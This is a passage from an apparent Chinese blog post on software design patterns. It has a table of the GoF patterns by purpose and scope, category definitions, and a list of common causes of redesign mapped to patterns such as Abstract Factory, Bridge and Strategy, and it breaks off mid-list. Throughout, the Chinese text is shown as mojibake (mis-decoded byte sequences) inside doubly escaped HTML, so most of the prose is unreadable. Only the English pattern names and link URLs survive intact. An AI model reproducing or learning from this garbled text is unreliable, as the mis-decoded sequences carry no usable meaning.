&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ç›®çš„&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left" valign="top">
&amp;nbsp;åˆ›å»ºå‹&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;&amp;nbsp;ç»“æ„å‹&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;è¡Œä¸ºå‹&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td rowspan="2" align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;èŒƒå›´&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;ç±»&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;Factory&amp;nbsp;Method&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;&amp;nbsp;Adapter&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;Interpreter&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Template&amp;nbsp;Method&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;å¯¹è±¡&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Abstract&amp;nbsp;Factory&amp;nbsp;&lt;br />
&amp;nbsp;Builder&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Prototype&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Singleton&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Adapter&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Bridge&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Composite&amp;nbsp;&lt;br />
&amp;nbsp;Decorator&amp;nbsp;&lt;br />
&amp;nbsp;Facade&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Flyweight&amp;nbsp;&lt;br />
&amp;nbsp;Proxy&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td align="left" valign="top">
&amp;nbsp;Chain&amp;nbsp;of&amp;nbsp;Responsibility&amp;nbsp;&lt;br />
&amp;nbsp;Command&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Iterator&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Mediator&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Memento&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Observer&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;State&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Strategy&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;Visitor&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;/tr>
&lt;/table>
&lt;p>æŒ‰ç›®çš„åˆ†ç±»ï¼š&lt;/p>
&lt;dl>
&lt;dt>åˆ›å»ºå‹&lt;/dt>
&lt;dd>ä¸å¯¹è±¡çš„åˆ›å»ºæœ‰å…³ã€‚&lt;/dd>
&lt;dt>ç»“æ„å‹&lt;/dt>
&lt;dd>å¤„ç†ç±»æˆ–å¯¹è±¡çš„ç»„åˆã€‚&lt;/dd>
&lt;dt>è¡Œä¸ºå‹&lt;/dt>
&lt;dd>å¯¹ç±»æˆ–å¯¹è±¡æ€æ ·äº¤äº’ã€æ€æ ·åˆ†é…èŒè´£è¿›è¡Œæè¿°ã€‚&lt;/dd>
&lt;/dl>
&lt;p>æŒ‰èŒƒå›´åˆ†ç±»ï¼š&lt;/p>
&lt;dl>
&lt;dt>ç±»æ¨¡å¼&lt;/dt>
&lt;dd>å¤„ç†ç±»å’Œå­ç±»ä¹‹é—´çš„å…³ç³»ï¼Œè¿™äº›å…³ç³»é€šè¿‡ç»§æ‰¿å»ºç«‹ï¼Œæ˜¯é™æ€çš„ï¼Œåœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šä¸‹æ¥äº†ã€‚&lt;/dd>
&lt;dt>å¯¹è±¡æ¨¡å¼&lt;/dt>
&lt;dd>å¤„ç†å¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œè¿™äº›å…³ç³»åœ¨è¿è¡Œæ—¶æ˜¯å¯ä»¥å˜åŒ–çš„ï¼Œæ›´å…·åŠ¨æ€æ€§ã€‚å…¶å®ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼Œå‡ ä¹æ‰€æœ‰æ¨¡å¼éƒ½ä½¿ç”¨ç»§æ‰¿æœºåˆ¶ï¼Œæ‰€ä»¥ã€ç±»æ¨¡å¼ã€åªæŒ‡é‚£äº›é›†ä¸­äºå¤„ç†ç±»é—´å…³ç³»çš„æ¨¡å¼ï¼Œè€Œå¤§éƒ¨åˆ†æ¨¡å¼éƒ½å±äºå¯¹è±¡æ¨¡å¼çš„èŒƒç•´ã€‚&lt;/dd>
&lt;/dl>
&lt;p>åˆ›å»ºå‹ç±»æ¨¡å¼å°†å¯¹è±¡çš„éƒ¨åˆ†åˆ›å»ºå·¥ä½œå»¶è¿Ÿåˆ°å­ç±»ï¼Œè€Œåˆ›å»ºå‹å¯¹è±¡æ¨¡å¼åˆ™å°†å®ƒå»¶è¿Ÿåˆ°å¦ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚ç»“æ„å‹ç±»æ¨¡å¼ä½¿ç”¨ç»§æ‰¿æœºåˆ¶æ¥ç»„åˆç±»ï¼Œè€Œç»“æ„å‹å¯¹è±¡æ¨¡å¼åˆ™æè¿°äº†å¯¹è±¡çš„ç»„è£…æ–¹å¼ã€‚è¡Œä¸ºå‹ç±»æ¨¡å¼ä½¿ç”¨ç»§æ‰¿æè¿°ç®—æ³•å’Œæ§åˆ¶æµï¼Œè€Œè¡Œä¸ºå‹å¯¹è±¡æ¨¡å¼åˆ™æè¿°äº†ä¸€ç»„å¯¹è±¡æ€æ ·åä½œå®Œæˆå•ä¸ªå¯¹è±¡æ‰€æ— æ³•å®Œæˆçš„ä»»åŠ¡ã€‚&lt;/p>
&lt;h3 id="å¸¸è§çš„è®¾è®¡é—®é¢˜åŠç›¸å…³æ¨¡å¼åº”ç”¨">å¸¸è§çš„è®¾è®¡é—®é¢˜åŠç›¸å…³æ¨¡å¼åº”ç”¨&lt;/h3>
&lt;p>å‰é¢åœ¨&lt;a href="https://mincodes.com/posts/design-patterns/#open-closed-principle-%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99">å¼€é—­åŸåˆ™&lt;/a>ä¸­æåˆ°è®¾è®¡åº”è¯¥æ”¯æŒå˜åŒ–ï¼Œä¸‹é¢ä»‹ç»ä¸€äº›å¯¼è‡´é‡æ–°è®¾è®¡çš„ä¸€èˆ¬åŸå› ï¼Œä»¥åŠè§£å†³è¿™äº›é—®é¢˜çš„è®¾è®¡æ¨¡å¼ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>é€šè¿‡æ˜¾å¼æŒ‡å®šä¸€ä¸ªç±»æ¥åˆ›å»ºå¯¹è±¡&lt;/strong>&lt;/p>
&lt;p>åœ¨åˆ›å»ºå¯¹è±¡æ—¶æŒ‡å®šç±»åä¼šä½¿å¾—ä½ å—åˆ°ç‰¹å®šå®ç°çš„çº¦æŸï¼Œè€Œä¸æ˜¯ç‰¹å®šæ¥å£çš„çº¦æŸã€‚è¦é¿å…è¿™ç§æƒ…å†µï¼Œåº”è¯¥é—´æ¥åœ°åˆ›å»ºå¯¹è±¡ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">Abstract Factory æŠ½è±¡å·¥å‚&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-creational/#å·¥å‚æ–¹æ³•--factory-method">Factory Method å·¥å‚æ–¹æ³•&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-creational/#åŸå‹--prototype">Prototype åŸå‹&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¯¹ç‰¹æ®Šæ“ä½œçš„ä¾èµ–&lt;/strong>&lt;/p>
&lt;p>å½“ä½ ä¸ºè¯·æ±‚æŒ‡å®šä¸€ä¸ªç‰¹æ®Šçš„æ“ä½œæ—¶ï¼Œå®Œæˆè¯¥è¯·æ±‚çš„æ–¹å¼å°±å›ºå®šä¸‹æ¥äº†ã€‚ä¸ºäº†é¿å…æŠŠè¯·æ±‚ä»£ç å†™æ­»ï¼Œä½ åº”è¯¥åœ¨ç¼–è¯‘æ—¶æˆ–è€…è¿è¡Œæ—¶æ”¯æŒå¯¹è¿™ç§è¯·æ±‚çš„å“åº”æ–¹å¼è¿›è¡Œä¿®æ”¹ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è´£ä»»é“¾--chain-of-responsibility">Chain of Responsibility è´£ä»»é“¾&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#å‘½ä»¤--command">Command å‘½ä»¤&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¯¹ç¡¬ä»¶å’Œè½¯ä»¶å¹³å°çš„ä¾èµ–&lt;/strong>&lt;/p>
&lt;p>å¤–éƒ¨çš„æ“ä½œç³»ç»Ÿæ¥å£å’Œåº”ç”¨ç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰åœ¨ä¸åŒçš„è½¯ç¡¬ä»¶å¹³å°ä¸Šæ˜¯ä¸åŒçš„ã€‚ä¾èµ–äºç‰¹å®šå¹³å°çš„è½¯ä»¶å°†å¾ˆéš¾ç§»æ¤åˆ°å…¶ä»–å¹³å°ä¸Šï¼Œç”šè‡³å¾ˆéš¾è·Ÿä¸Šæœ¬åœ°å¹³å°çš„æ›´æ–°ã€‚æ‰€ä»¥è®¾è®¡ç³»ç»Ÿæ—¶é™åˆ¶å…¶å¹³å°ç›¸å…³æ€§å°±å¾ˆé‡è¦äº†ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">Abstract Factory æŠ½è±¡å·¥å‚&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-structural/#æ¡¥æ¥--bridge">Bridge æ¡¥æ¥&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¯¹å¯¹è±¡è¡¨ç¤ºæˆ–å®ç°çš„ä¾èµ–&lt;/strong>&lt;/p>
&lt;p>çŸ¥é“å¯¹è±¡æ€æ ·è¡¨ç¤ºã€ä¿å­˜ã€å®šä½æˆ–å®ç°çš„å®¢æˆ·åœ¨å¯¹è±¡å‘ç”Ÿå˜åŒ–æ—¶å¯èƒ½ä¹Ÿéœ€è¦å˜åŒ–ã€‚å¯¹å®¢æˆ·éšè—è¿™äº›ä¿¡æ¯èƒ½é˜»æ­¢è¿é”å˜åŒ–ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">Abstract Factory æŠ½è±¡å·¥å‚&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-structural/#æ¡¥æ¥--bridge">Bridge æ¡¥æ¥&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#å¤‡å¿˜å½•--memento">Memento å¤‡å¿˜å½•&lt;/a>, &lt;a href="https://mincodes.com/posts/design-patterns-structural/#ä»£ç†--proxy">Proxy ä»£ç†&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç®—æ³•ä¾èµ–&lt;/strong>&lt;/p>
&lt;p>ç®—æ³•åœ¨å¼€å‘å’Œå¤ç”¨æ—¶å¸¸å¸¸è¢«æ‰©å±•ã€ä¼˜åŒ–å’Œæ›¿ä»£ã€‚ä¾èµ–äºæŸä¸ªç‰¹å®šç®—æ³•çš„å®ä½“åœ¨ç®—æ³•å‘ç”Ÿå˜åŒ–æ—¶ä¸å¾—ä¸å˜åŒ–ã€‚å› æ­¤æœ‰å¯èƒ½å‘ç”Ÿå˜åŒ–çš„ç®—æ³•åº”è¯¥è¢«ç‹¬ç«‹å‡ºæ¥ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-creational/#ç”Ÿæˆå™¨--builder">Builder ç”Ÿæˆå™¨&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è¿­ä»£å™¨--iterator">Iterator è¿­ä»£å™¨&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ç­–ç•¥--strategy">Strategy ç­–ç•¥&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#æ¨¡æ¿æ–¹æ³•--template-method">Template Method æ¨¡æ¿æ–¹æ³•&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è®¿é—®è€…--visitor">Visitor è®¿é—®è€…&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç´§è€¦åˆ&lt;/strong>&lt;/p>
&lt;p>ç´§è€¦åˆçš„ç±»å¾ˆéš¾ç‹¬ç«‹åœ°è¢«å¤ç”¨ï¼Œå› ä¸ºå®ƒä»¬æ˜¯äº’ç›¸ä¾èµ–çš„ã€‚ç´§è€¦åˆäº§ç”Ÿå•å—çš„ç³»ç»Ÿï¼Œè¦æ”¹å˜æˆ–åˆ æ‰ä¸€ä¸ªç±»ï¼Œä½ å¿…é¡»ç†è§£å’Œæ”¹å˜å…¶ä»–è®¸å¤šç±»ã€‚è¿™æ ·çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªå¾ˆéš¾å­¦ä¹ ã€ç§»æ¤å’Œç»´æŠ¤çš„å¯†é›†ä½“ã€‚&lt;/p>
&lt;p>æ¾æ•£è€¦åˆæé«˜äº†ä¸€ä¸ªç±»æœ¬èº«è¢«å¤ç”¨çš„å¯èƒ½æ€§ï¼Œå¹¶ä¸”ç³»ç»Ÿæ›´æ˜“äºå­¦ä¹ ã€ç§»æ¤ã€ä¿®æ”¹å’Œæ‰©å±•ã€‚è®¾è®¡æ¨¡å¼ä½¿ç”¨æŠ½è±¡è€¦åˆå’Œåˆ†å±‚æŠ€æœ¯æ¥æé«˜ç³»ç»Ÿçš„æ¾æ•£è€¦åˆæ€§ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">Abstract Factory æŠ½è±¡å·¥å‚&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#å‘½ä»¤--command">Command å‘½ä»¤&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-structural/#å¤–è§‚--facade">Facade å¤–è§‚&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ä¸­ä»‹è€…--mediator">Mediator ä¸­ä»‹è€…&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è§‚å¯Ÿè€…--observer">Observer è§‚å¯Ÿè€…&lt;/a>ï¼Œ &lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è´£ä»»é“¾--chain-of-responsibility">Chain of Responsibility è´£ä»»é“¾&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ»¥ç”¨ç»§æ‰¿&lt;/strong>&lt;/p>
&lt;p>é€šè¿‡å®šä¹‰å­ç±»æ¥æ‰©å……åŠŸèƒ½æ˜¯ä¸€ç§æ¯”è¾ƒç¬¨æ‹™çš„æ–¹å¼ï¼Œè€Œä¸”æå®¹æ˜“å¯¼è‡´å­ç±»æ•°é‡çˆ†ç‚¸ã€‚å®šä¹‰å­ç±»è¿˜éœ€è¦å¯¹çˆ¶ç±»æœ‰æ·±å…¥çš„äº†è§£ï¼Œæˆæœ¬è¾ƒé«˜ã€å®¹æ˜“çŠ¯é”™ä¸”è€¦åˆç´§å¯†ã€‚ä¸€æ—¦å‡ºç°ä¸¤ä¸ªç»´åº¦çš„å®šåˆ¶åŒ–ä¿¡æ¯ï¼Œæå®¹æ˜“å¯¼è‡´å­ç±»æ•°é‡çˆ†ç‚¸ï¼Œä»è€Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿå˜å¾—éš¾ä»¥ç»´æŠ¤ã€‚&lt;/p>
&lt;p>å¯¹è±¡ç»„åˆæŠ€æœ¯æ˜¯ç»§æ‰¿ä¹‹å¤–æ„å»ºæ–°åŠŸèƒ½çš„å¦ä¸€ç§çµæ´»æ–¹æ³•ã€‚æ–°çš„åŠŸèƒ½å¯ä»¥é€šè¿‡ä»¥æ–°çš„æ–¹å¼ç»„åˆå·²æœ‰å¯¹è±¡æ¥å®ç°ã€‚å¦ä¸€æ–¹é¢ï¼Œè¿‡å¤šä½¿ç”¨å¯¹è±¡ç»„åˆä¹Ÿå¯èƒ½ä¼šå¯¼è‡´è®¾è®¡éš¾ä»¥ç†è§£ã€‚å› æ­¤ï¼Œè®¸å¤šè®¾è®¡æ¨¡å¼å¾€å¾€ä¼šå°†ä¸¤è€…ç»“åˆèµ·æ¥ï¼Œä¾‹å¦‚å®šä¹‰ä¸€ä¸ªå­ç±»ï¼Œå¹¶å°†å®ƒçš„å®ä¾‹å’Œå·²å­˜åœ¨å®ä¾‹è¿›è¡Œç»„åˆæ¥å¼•å…¥å®šåˆ¶çš„åŠŸèƒ½ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-structural/#æ¡¥æ¥--bridge">Bridge æ¡¥æ¥&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è´£ä»»é“¾--chain-of-responsibility">Chain of Responsibility è´£ä»»é“¾&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">Composite ç»„åˆ&lt;/a>ï¼Œ
&lt;a href="https://mincodes.com/posts/design-patterns-structural/#è£…é¥°å™¨--decorator">Decorator è£…é¥°å™¨&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è§‚å¯Ÿè€…--observer">Observer è§‚å¯Ÿè€…&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ç­–ç•¥--strategy">Strategy ç­–ç•¥&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ä¸èƒ½æ–¹ä¾¿åœ°å¯¹ç±»è¿›è¡Œä¿®æ”¹&lt;/strong>&lt;/p>
&lt;p>æœ‰æ—¶ä½ ä¸å¾—ä¸æ”¹å˜ä¸€ä¸ªéš¾ä»¥ä¿®æ”¹çš„ç±»ã€‚ä¹Ÿè®¸è¿™ä¸ªç±»ä¸å±äºä½ ç»´æŠ¤ï¼Œä½ æ²¡æœ‰æºä»£ç ï¼Œæˆ–è€…å¯¹ç±»çš„ä¿®æ”¹ä¼šå¯¼è‡´å¾ˆå¤šå…¶ä»–ä¾èµ–æ–¹çš„æ”¹åŠ¨ã€‚è®¾è®¡æ¨¡å¼æä¾›äº†åœ¨è¿™äº›æƒ…å†µä¸‹å¯¹ç±»è¿›è¡Œä¿®æ”¹çš„æ–¹æ³•ã€‚&lt;/p>
